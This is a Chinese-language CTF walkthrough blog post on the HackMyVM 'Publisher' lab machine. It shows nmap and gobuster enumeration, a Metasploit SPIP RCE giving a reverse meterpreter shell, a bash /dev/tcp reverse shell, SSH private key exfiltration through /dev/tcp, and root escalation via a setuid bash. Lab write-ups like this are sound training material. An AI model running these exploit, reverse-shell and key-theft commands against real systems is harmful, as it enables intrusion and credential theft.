@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_publisher
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
+**难度**：绿色
+**目标 IP**：192.168.205.211
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
+Nmap scan report for 192.168.205.211
+Host is up (0.0012s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。">
+<meta property="og:title" content="hmv_publisher">
+<meta property="og:description" content="# hmv_publisher
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
+**难度**：绿色
+**目标 IP**：192.168.205.211
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
+Nmap scan report for 192.168.205.211
+Host is up (0.0012s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_publisher.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_publisher</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_publisher</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/33" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_publisher</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Leet" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Leet</a><br>
+<strong>难度</strong>：绿色<br>
+<strong>目标 IP</strong>：192.168.205.211<br>
+<strong>本机</strong> IP：192.168.205.141</p>
+<hr>
+<h3><strong>1. 端口枚举及服务探测</strong></h3>
+<p>首先，使用 <code class="notranslate">nmap</code> 扫描目标 IP 的开放端口，命令如下：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.211
+Host is up (0.0012s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux<span class="pl-k">;</span> protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 <span class="pl-s"><span class="pl-pds">((</span>Ubuntu<span class="pl-pds">))</span></span>
+MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X<span class="pl-k">|</span>5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 9.99 seconds</pre></div>
+<p>扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</p>
+<hr>
+<h3><strong>2. Web 服务探测与目录爆破</strong></h3>
+<p>对 80 端口感兴趣，访问 Web 页面，发现其是一个静态页面，包含多个锚点。使用 <code class="notranslate">whatweb</code> 探测：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.211/   
+http://192.168.205.211/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], Title[Publisher<span class="pl-s"><span class="pl-pds">'</span>s Pulse: SPIP Insights &amp; Tips]</span></pre></div>
+<p>单纯静态页，目录爆破吧。</p>
+<p>使用 <code class="notranslate">gobuster</code> 进行目录爆破：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.211/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.211/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,txt,md
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+/images               (Status: 301) [Size: 319] [--<span class="pl-k">&gt;</span> http://192.168.205.211/images/]
+/index.html           (Status: 200) [Size: 8686]
+/spip                 (Status: 301) [Size: 317] [--<span class="pl-k">&gt;</span> http://192.168.205.211/spip/]
+/.html                (Status: 403) [Size: 280]
+/.php                 (Status: 403) [Size: 280]
+/server-status        (Status: 403) [Size: 280]
+Progress: 2314636 / 6369165 (36.34%)^C
+[<span class="pl-k">!</span>] Keyboard interrupt detected, terminating.
+Progress: 2319486 / 6369165 (36.42%)
+===============================================================
+Finished
+===============================================================
+                                                          </pre></div>
+<p>爆破结果显示 <code class="notranslate">/images</code> 和 <code class="notranslate">/spip</code> 目录存在，并且 <code class="notranslate">/spip/</code> 看起来是个感兴趣的目标。</p>
+<hr>
+<h3><strong>3. 利用 SPIP 远程代码执行漏洞</strong></h3>
+<p>访问 <code class="notranslate">http://192.168.205.211/spip/</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3"><img src="https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3" alt="image" style="max-width: 100%;"></a></p>
+<p>使用 <code class="notranslate">whatweb</code> 探测</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.211/spip/   
+http://192.168.205.211/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.205.211/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
+</pre></div>
+<p>使用 <code class="notranslate">searchsploit</code> 查找相关的漏洞利用脚本：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ searchsploit SPIP 4.2.0                                                                                  
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       <span class="pl-k">|</span>  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                <span class="pl-k">|</span> php/webapps/51536.py
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                      </pre></div>
+<p>找到一个远程代码执行漏洞 (<code class="notranslate">SPIP v4.2.0 - Remote Code Execution (Unauthenticated)</code>),利用一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ python3 51536.py 
+usage: 51536.py [-h] -u URL -c COMMAND [-v]
+51536.py: error: the following arguments are required: -u/--url, -c/--command
+                                                                                                                                 
+┌──(kali㉿kali)-[~/test]
+└─$ python3 51536.py -u http://192.168.205.211/spip/ -c id
+Traceback (most recent call last):
+  File <span class="pl-s"><span class="pl-pds">"</span>/home/kali/test/51536.py<span class="pl-pds">"</span></span>, line 63, <span class="pl-k">in</span> <span class="pl-k">&lt;</span>module<span class="pl-k">&gt;</span>
+    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += <span class="pl-s"><span class="pl-pds">'</span>:HIGH:!DH:!aNULL<span class="pl-pds">'</span></span>
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: module <span class="pl-s"><span class="pl-pds">'</span>urllib3.util.ssl_<span class="pl-pds">'</span></span> has no attribute <span class="pl-s"><span class="pl-pds">'</span>DEFAULT_CIPHERS<span class="pl-pds">'</span></span></pre></div>
+<p>报错，换 Metasploit 利用该漏洞：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">msfconsole
+msf6 <span class="pl-k">&gt;</span> search SPIP 4.2
+
+Matching Modules
+================
+
+   <span class="pl-c"><span class="pl-c">#</span>   Name                                             Disclosure Date  Rank       Check  Description</span>
+   -   ----                                             ---------------  ----       -----  -----------
+   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
+   1     <span class="pl-cce">\_</span> target: PHP In-Memory                       <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   2     <span class="pl-cce">\_</span> target: Unix/Linux Command Shell            <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   3     <span class="pl-cce">\_</span> target: Windows Command Shell               <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
+   5     <span class="pl-cce">\_</span> target: PHP In-Memory                       <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   6     <span class="pl-cce">\_</span> target: Unix/Linux Command Shell            <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   7     <span class="pl-cce">\_</span> target: Windows Command Shell               <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
+   9     <span class="pl-cce">\_</span> target: PHP In-Memory                       <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   10    <span class="pl-cce">\_</span> target: Unix/Linux Command Shell            <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+   11    <span class="pl-cce">\_</span> target: Windows Command Shell               <span class="pl-c1">.</span>                <span class="pl-c1">.</span>          <span class="pl-c1">.</span>      <span class="pl-c1">.</span>
+
+
+Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form
+After interacting with a module you can manually <span class="pl-c1">set</span> a TARGET with <span class="pl-c1">set</span> TARGET <span class="pl-s"><span class="pl-pds">'</span>Windows Command Shell<span class="pl-pds">'</span></span>
+
+msf6 <span class="pl-k">&gt;</span> use 0
+[<span class="pl-k">*</span>] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/spip_bigup_unauth_rce) <span class="pl-k">&gt;</span> show options 
+
+Module options (exploit/multi/http/spip_bigup_unauth_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   FORM_PAGE  Auto             yes       A page with a form.
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        <span class="pl-c1">false</span>            no        Negotiate SSL/TLS <span class="pl-k">for</span> outgoing connections
+   TARGETURI  /                yes       Path to Spip install
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.205.141  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP In-Memory
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/spip_bigup_unauth_rce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> RHOSTS http://192.168.205.211/spip/
+RHOSTS =<span class="pl-k">&gt;</span> http://192.168.205.211/spip/
+msf6 exploit(multi/http/spip_bigup_unauth_rce) <span class="pl-k">&gt;</span> run
+
+[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.205.141:4444 
+[<span class="pl-k">*</span>] Running automatic check (<span class="pl-s"><span class="pl-pds">"</span>set AutoCheck false<span class="pl-pds">"</span></span> to disable)
+[<span class="pl-k">*</span>] SPIP Version detected: 4.2.0
+[+] SPIP version 4.2.0 is vulnerable.
+[<span class="pl-k">*</span>] Bigup plugin version detected: 3.2.1
+[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
+[<span class="pl-k">*</span>] Found formulaire_action: login
+[<span class="pl-k">*</span>] Found formulaire_action_args: CKNCtIY6q36vgXbnqHlnO...
+[<span class="pl-k">*</span>] Preparing to send exploit payload to the target...
+[<span class="pl-k">*</span>] Sending stage (40004 bytes) to 192.168.205.211
+[<span class="pl-k">*</span>] Meterpreter session 1 opened (192.168.205.141:4444 -<span class="pl-k">&gt;</span> 192.168.205.211:44672) at 2024-12-29 12:41:44 +0800
+
+meterpreter <span class="pl-k">&gt;</span> shell
+Process 52 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>成功获得 Meterpreter shell</p>
+<hr>
+<h3><strong>4. 获得更稳定的 shell</strong></h3>
+<p>为了获得更稳定的 shell，创建一个反向 shell 脚本，并上传到目标机器：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat a.sh  
+bash -i <span class="pl-k">&gt;&amp;</span> /dev/tcp/192.168.205.141/8888 <span class="pl-k">0&gt;&amp;1</span>  
+chmod +x a.sh  
+bash a.sh</pre></div>
+<p>获得交互式 TTY shell：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<hr>
+<h3><strong>5. 获取</strong> <strong>​</strong>​<strong>​<code class="notranslate">think</code>​</strong>​<strong>​</strong> <strong>用户 SSH 密钥</strong></h3>
+<p>访问 <code class="notranslate">/home/</code> 目录，发现 <code class="notranslate">think</code> 用户目录下的 <code class="notranslate">.ssh</code> 目录具有读取权限。由于本机没有 SSH 客户端，可以通过 <code class="notranslate">cat</code> 将私钥传输回攻击机，并登录到目标机器：</p>
+<h4>目标机器：</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat id_rsa <span class="pl-k">&gt;</span> /dev/tcp/192.168.205.141/7777</pre></div>
+<h4>攻击机：</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 7777 <span class="pl-k">&gt;</span> id_rsa  
+chmod 600 id_rsa  
+ssh think@192.168.205.211 -i id_rsa</pre></div>
+<p>成功登录 <code class="notranslate">think</code> 用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">think@publisher:<span class="pl-k">~</span>$ id  
+uid=1000(think) gid=1000(think) groups=1000(think)</pre></div>
+<hr>
+<h3><strong>6. 使用</strong> <strong>​</strong>​<strong>​<code class="notranslate">linpeas</code>​</strong>​<strong>​</strong> <strong>查找提权漏洞</strong></h3>
+<p>将 <code class="notranslate">linpeas.sh</code> 脚本上传至目标机器：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">think@publisher:<span class="pl-k">~</span>$ curl 192.168.205.141:8000/linpeas.sh -o /home/think/linpeas.sh  
+think@publisher:<span class="pl-k">~</span>$ chmod +x linpeas.sh  
+think@publisher:<span class="pl-k">~</span>$ bash linpeas.sh</pre></div>
+<p>在脚本输出中，发现一个未知的二进制文件 <code class="notranslate">/usr/sbin/run_container</code>，通过 <code class="notranslate">strings</code> 命令进行分析：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">think@publisher:<span class="pl-k">~</span>$ strings /usr/sbin/run_container
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__stack_chk_fail
+execve
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A<span class="pl-cce">\A</span>]A^A_
+/bin/bash
+/opt/run_container.sh
+:<span class="pl-k">*</span>3<span class="pl-s"><span class="pl-pds">$"</span></span>
+<span class="pl-s">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0</span>
+<span class="pl-s">crtstuff.c</span>
+<span class="pl-s">deregister_tm_clones</span>
+<span class="pl-s">__do_global_dtors_aux</span>
+<span class="pl-s">completed.8061</span>
+<span class="pl-s">__do_global_dtors_aux_fini_array_entry</span>
+<span class="pl-s">frame_dummy</span>
+<span class="pl-s">__frame_dummy_init_array_entry</span>
+<span class="pl-s">run_container.c</span>
+<span class="pl-s">__FRAME_END__</span>
+<span class="pl-s">__init_array_end</span>
+<span class="pl-s">_DYNAMIC</span>
+<span class="pl-s">__init_array_start</span>
+<span class="pl-s">__GNU_EH_FRAME_HDR</span>
+<span class="pl-s">_GLOBAL_OFFSET_TABLE_</span>
+<span class="pl-s">__libc_csu_fini</span>
+<span class="pl-s">_ITM_deregisterTMCloneTable</span>
+<span class="pl-s">_edata</span>
+<span class="pl-s">__stack_chk_fail@@GLIBC_2.4</span>
+<span class="pl-s">__libc_start_main@@GLIBC_2.2.5</span>
+<span class="pl-s">execve@@GLIBC_2.2.5</span>
+<span class="pl-s">__data_start</span>
+<span class="pl-s">__gmon_start__</span>
+<span class="pl-s">__dso_handle</span>
+<span class="pl-s">_IO_stdin_used</span>
+<span class="pl-s">__libc_csu_init</span>
+<span class="pl-s">__bss_start</span>
+<span class="pl-s">main</span>
+<span class="pl-s">__TMC_END__</span>
+<span class="pl-s">_ITM_registerTMCloneTable</span>
+<span class="pl-s">__cxa_finalize@@GLIBC_2.2.5</span>
+<span class="pl-s">.symtab</span>
+<span class="pl-s">.strtab</span>
+<span class="pl-s">.shstrtab</span>
+<span class="pl-s">.interp</span>
+<span class="pl-s">.note.gnu.property</span>
+<span class="pl-s">.note.gnu.build-id</span>
+<span class="pl-s">.note.ABI-tag</span>
+<span class="pl-s">.gnu.hash</span>
+<span class="pl-s">.dynsym</span>
+<span class="pl-s">.dynstr</span>
+<span class="pl-s">.gnu.version</span>
+<span class="pl-s">.gnu.version_r</span>
+<span class="pl-s">.rela.dyn</span>
+<span class="pl-s">.rela.plt</span>
+<span class="pl-s">.init</span>
+<span class="pl-s">.plt.got</span>
+<span class="pl-s">.plt.sec</span>
+<span class="pl-s">.text</span>
+<span class="pl-s">.fini</span>
+<span class="pl-s">.rodata</span>
+<span class="pl-s">.eh_frame_hdr</span>
+<span class="pl-s">.eh_frame</span>
+<span class="pl-s">.init_array</span>
+<span class="pl-s">.fini_array</span>
+<span class="pl-s">.dynamic</span>
+<span class="pl-s">.data</span>
+<span class="pl-s">.bss</span>
+<span class="pl-s">.comment</span></pre></div>
+<p>发现该二进制文件似乎与 <code class="notranslate">/bin/bash</code>、<code class="notranslate">/opt/run_container.sh</code>，似乎是使用bash运行<code class="notranslate">/opt/run_container.sh</code>。但是当我查看<code class="notranslate">/opt/run_container.sh</code>时发现我没有<code class="notranslate">/opt/</code>目录的访问权限，然后就歇b了，实在做不出来我就去看其他师傅的wp了，看的是<code class="notranslate">ll104567</code>和<code class="notranslate">HGBE</code>两位师傅的wp,发现当前使用的是<code class="notranslate">受限外壳</code>,需要绕过。</p>
+<hr>
+<h3><strong>7. 提权为 root</strong></h3>
+<p>通过动态链接库生成 <code class="notranslate">bash</code> shell 来提权。首先，加载 <code class="notranslate">bash</code> 所需的共享库：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash</pre></div>
+<p>运行 <code class="notranslate">/usr/sbin/run_container</code>让它触发执行<code class="notranslate">/opt/run_container.sh</code>，并修改<code class="notranslate">/opt/run_container.sh</code>脚本：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">think@publisher:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /opt/run_container.sh
+think@publisher:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> /opt/run_container.sh
+think@publisher:<span class="pl-k">~</span>$/usr/sbin/run_container
+think@publisher:<span class="pl-k">~</span>$ cat /opt/run_container.sh
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash  </span>
+chmod +s /bin/bash  </pre></div>
+<p>然后使用 <code class="notranslate">bash -p</code> 提升权限为 root：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">think@publisher:<span class="pl-k">~</span>$ bash -p  
+bash-5.0# id 
+uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)</pre></div>
+<hr>
+<p>成功获取 root 权限后，已完全控制目标系统。</p>
+<h3>参考</h3>
+<p><a href="https://hgbe02.github.io/Hackmyvm/publisher.html" rel="nofollow">HGBE</a></p>
+<p><a href="https://www.bilibili.com/video/BV1TM4m1U7y4/" rel="nofollow">ll104567</a></p>
+<p><a href="https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d" rel="nofollow">voltage</a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 